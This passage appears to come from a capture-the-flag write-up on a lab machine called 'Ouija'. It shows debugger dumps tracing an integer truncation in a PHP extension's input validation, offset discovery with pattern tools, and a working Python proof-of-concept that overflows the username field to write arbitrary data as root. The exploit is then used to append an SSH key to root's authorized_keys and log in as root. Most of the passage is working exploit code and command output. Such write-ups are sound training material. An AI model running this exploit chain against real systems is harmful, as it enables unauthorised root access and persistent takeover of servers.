   0x7ffff351c8ce <validating_userinput+126>:   mov    r13,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffc550 ("/var/log/lverifi\202\t")
0008| 0x7fffffffc558 ("/lverifi\202\t")
0016| 0x7fffffffc560 --> 0x982 
0024| 0x7fffffffc568 --> 0x0 
0032| 0x7fffffffc570 --> 0x0 
0040| 0x7fffffffc578 --> 0x0 
0048| 0x7fffffffc580 --> 0x0 
0056| 0x7fffffffc588 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

```

I’ll run again, this time with 65535 “A” characters:

```

php > say_lverifier(str_repeat("A", 65535), "password123");

```

I would expect to get 65535 + 10 rounded up to 0x10010. But the value is only 0x10:

```

[----------------------------------registers-----------------------------------]
RAX: 0x10 
RBX: 0x7ffff5269400 ("password123")
RCX: 0x51 ('Q')
RDX: 0xffff 
RSI: 0x676f6c2e7265 ('er.log')
RDI: 0x7fffffffc5f0 --> 0x100000001 
RBP: 0x7fffffffcbc0 --> 0x0 
RSP: 0x7fffffffc550 ("/var/log/lverifi\202\t")
RIP: 0x7ffff351c8bf (<validating_userinput+111>:        sub    rsp,rax)
R8 : 0x7fffffffcbe8 --> 0xb ('\x0b')
R9 : 0x0 
R10: 0x2 
R11: 0x1 
R12: 0x7ffff52a0018 ('A' <repeats 200 times>...)
R13: 0x7fffffffcd10 --> 0x3e003e0000000000 ('')
R14: 0x7ffff5212020 --> 0x7ffff52820e0 --> 0x5555558bcf33 (<execute_ex+14339>:  endbr64)
R15: 0x7ffff52820e0 --> 0x5555558bcf33 (<execute_ex+14339>:     endbr64)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff351c8ad <validating_userinput+93>:    movaps XMMWORD PTR [rbp-0x650],xmm0
   0x7ffff351c8b4 <validating_userinput+100>:   and    rax,0xfffffffffffffff0
   0x7ffff351c8b8 <validating_userinput+104>:   movaps XMMWORD PTR [rbp-0x640],xmm0
=> 0x7ffff351c8bf <validating_userinput+111>:   sub    rsp,rax
   0x7ffff351c8c2 <validating_userinput+114>:   xor    eax,eax
   0x7ffff351c8c4 <validating_userinput+116>:   movaps XMMWORD PTR [rbp-0x630],xmm0
   0x7ffff351c8cb <validating_userinput+123>:   rep stos QWORD PTR es:[rdi],rax
   0x7ffff351c8ce <validating_userinput+126>:   mov    r13,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffc550 ("/var/log/lverifi\202\t")
0008| 0x7fffffffc558 ("/lverifi\202\t")
0016| 0x7fffffffc560 --> 0x982 
0024| 0x7fffffffc568 --> 0x0 
0032| 0x7fffffffc570 --> 0x0 
0040| 0x7fffffffc578 --> 0x0 
0048| 0x7fffffffc580 --> 0x0 
0056| 0x7fffffffc588 --> 0x0 
[------------------------------------------------------------------------------]

```

The top bit got dropped. I’ll add a breakpoint at `validating_userinput+218` and continue. This is the check for if `username` is longer than 800 (jumping if not):

```

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffc880 --> 0x0 
RBX: 0x7ffff5269400 ("password123")
RCX: 0x0 
RDX: 0xffff 
RSI: 0x676f6c2e7265 ('er.log')
RDI: 0x7fffffffc878 --> 0x0 
RBP: 0x7fffffffcbc0 --> 0x0 
RSP: 0x7fffffffc540 --> 0x555555dcd0d0 --> 0x555555dcd 
RIP: 0x7ffff351c92a (<validating_userinput+218>:        jbe    0x7ffff351c9c0 <validating_userinput+368>)
R8 : 0x7fffffffcbe8 --> 0xb ('\x0b')
R9 : 0x0 
R10: 0x2 
R11: 0x1 
R12: 0x7ffff52a0018 ('A' <repeats 200 times>...)
R13: 0x7fffffffc540 --> 0x555555dcd0d0 --> 0x555555dcd 
R14: 0x7ffff5212020 --> 0x7ffff52820e0 --> 0x5555558bcf33 (<execute_ex+14339>:  endbr64)
R15: 0x7ffff52820e0 --> 0x5555558bcf33 (<execute_ex+14339>:     endbr64)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff351c916 <validating_userinput+198>:   mov    DWORD PTR [rdi],0x0
   0x7ffff351c91c <validating_userinput+204>:   movaps XMMWORD PTR [rbp-0x5e0],xmm0
   0x7ffff351c923 <validating_userinput+211>:   cmp    rdx,0x320
=> 0x7ffff351c92a <validating_userinput+218>:   jbe    0x7ffff351c9c0 <validating_userinput+368>
   0x7ffff351c930 <validating_userinput+224>:   mov    ecx,0x64
   0x7ffff351c935 <validating_userinput+229>:   mov    rdi,rax
   0x7ffff351c938 <validating_userinput+232>:   mov    rsi,r12
   0x7ffff351c93b <validating_userinput+235>:   rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
                                                              JUMP is NOT taken
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffc540 --> 0x555555dcd0d0 --> 0x555555dcd 
0008| 0x7fffffffc548 --> 0x7ffff351c86d (<validating_userinput+29>:     movdqa xmm0,XMMWORD PTR [rip+0x89b]        # 0x7ffff351d110)
0016| 0x7fffffffc550 ("/var/log/lverifier.log")
0024| 0x7fffffffc558 ("/lverifier.log")
0032| 0x7fffffffc560 --> 0x676f6c2e7265 ('er.log')
0040| 0x7fffffffc568 --> 0x0 
0048| 0x7fffffffc570 --> 0x0 
0056| 0x7fffffffc578 --> 0x0 
[------------------------------------------------------------------------------]

```

“JUMP is NOT taken”. RDX what is compared to 0x320, and it’s 0xFFFF.

#### Calculating Offsets

Rather than do math, I’ll use a pattern to find out how to overwrite the values passed to `event_recorder` using `pattern_create`:

```

oxdf@hacky$ pattern_create -l 65535 > pattern

```

I’ll read the pattern from PHP and send it as the username:

```

php > $pattern = file_get_contents('pattern');
php > say_lverifier($pattern, "doesnotmatter");

```

I’ll break at `validating_userinput+332` and check the values passed in:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7ffff5269388 ("doesnotmatter")
RCX: 0x7ffff76c2a00 --> 0x0
RDX: 0x0
RSI: 0x7fffffffc5c0 ("2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8A"...)
RDI: 0x7fffffffc550 ("a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1"...)
RBP: 0x7fffffffcbc0 --> 0x2
RSP: 0x7fffffffc540 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
RIP: 0x7ffff351c99c (<validating_userinput+332>:        call   0x7ffff351c1b0 <event_recorder@plt>)
R8 : 0x7fffffffcbe8 --> 0xd ('\r')
R9 : 0x0
R10: 0x7ffff351d04d --> 0x3232303249504100 ('')
R11: 0x1
R12: 0x7fffffffc550 ("a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1"...)
R13: 0x7fffffffc540 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
R14: 0x7fffffffc5c0 ("2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8A"...)
R15: 0x7ffff5281060 --> 0x5555558bcf33 (<execute_ex+14339>:     endbr64)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff351c991 <validating_userinput+321>:   call   0x7ffff351c0c0 <printf@plt>
   0x7ffff351c996 <validating_userinput+326>:   mov    rsi,r14
   0x7ffff351c999 <validating_userinput+329>:   mov    rdi,r12
=> 0x7ffff351c99c <validating_userinput+332>:   call   0x7ffff351c1b0 <event_recorder@plt>
   0x7ffff351c9a1 <validating_userinput+337>:   mov    rsi,rbx
   0x7ffff351c9a4 <validating_userinput+340>:   mov    rdi,r13
   0x7ffff351c9a7 <validating_userinput+343>:   call   0x7ffff351c0f0 <load_users@plt>
   0x7ffff351c9ac <validating_userinput+348>:   lea    rsp,[rbp-0x20]
Guessed arguments:
arg[0]: 0x7fffffffc550 ("a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1"...)
arg[1]: 0x7fffffffc5c0 ("2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8A"...)
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffc540 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"...)
0008| 0x7fffffffc548 ("2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8A"...)
0016| 0x7fffffffc550 ("a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1"...)
0024| 0x7fffffffc558 ("Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah"...)
0032| 0x7fffffffc560 ("0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A"...)
0040| 0x7fffffffc568 ("b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9"...)
0048| 0x7fffffffc570 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai"...)
0056| 0x7fffffffc578 ("8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"...)
[------------------------------------------------------------------------------]

```

`pattern_offset` will get the offset from four bytes:

```

oxdf@hacky$ pattern_offset -q a5Aa
[*] Exact match at offset 16
oxdf@hacky$ pattern_offset -q 2Ae3
[*] Exact match at offset 128

```

So the offset of 16 is the log file, and the data is at 128.

#### Script POC

I’ll write a short Python script as a proof of concept. It assumed that I have a tunnel from 9999 on my host to 9999 on Ouija:

```

#!/usr/bin/env python3

import requests
import sys

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} [path to write] [data to write]")
    exit()

path = sys.argv[1]
data = sys.argv[2]

payload = "A"*16
payload += path + "\n"
payload += "B" * (128 - len(payload))
payload += "\n" + data + "\n"
payload += "C" * (65535 - len(payload))

requests.post("http://localhost:9999", data={"username": payload, "password": "password"})

```

I’ll try it writing data to a file I can see:

```

oxdf@hacky$ python exploit.py /tmp/0xdf "test"

```

The file exists and is owned by root:

```

leila@ouija:~$ ls -l /tmp/0xdf 
-rw-r--r-- 1 root root 2016 May 16 20:05 /tmp/0xdf

```

Interestingly, two lines wrote:

```

leila@ouija:~$ cat /tmp/0xdf

test
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

```

I’ll try again with my public key:

```

oxdf@hacky$ python exploit.py /tmp/0xdf "$( cat ~/keys/ed25519_gen.pub )"

```

It appended that data:

```

leila@ouija:~$ cat /tmp/0xdf

test
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

```

Appending is nice so I can target the `authorized_keys` file and it will add, not overwrite. It’s important to add the newline before the key or it could end up on the same line as the previous.

#### SSH

I’ll run the exploit targeting root’s `authorized_keys` file:

```

oxdf@hacky$ python exploit.py /root/.ssh/authorized_keys "$( cat ~/keys/ed25519_gen.pub )"

```

It works!

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@ouija.htb 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
...[snip]...
root@ouija:~#

```

And I can read the root flag:

```

root@ouija:~# cat root.txt
8fbc8a9c************************

```